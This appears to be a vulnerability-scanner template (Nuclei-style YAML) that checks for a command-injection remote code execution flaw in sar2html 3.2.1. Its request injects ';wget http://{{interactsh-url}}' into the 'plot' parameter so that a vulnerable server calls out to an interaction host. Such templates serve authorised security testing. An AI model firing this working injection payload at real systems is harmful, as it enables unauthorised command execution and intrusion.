id: sar2html-rce
info:
  author: gy741
  description: SAR2HTML could allow a remote attacker to execute arbitrary commands
    on the system, caused by a command injection flaw in the index.php script. By
    sending specially-crafted commands, an attacker could exploit this vulnerability
    to execute arbitrary commands on the system.
  name: sar2html 3.2.1 - 'plot' Remote Code Execution
  reference:
  - https://www.exploit-db.com/exploits/49344
  severity: critical
  tags: sar2html,rce,oast
requests:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  raw:
  - 'GET /index.php?plot=;wget%20http://{{interactsh-url}} HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    '
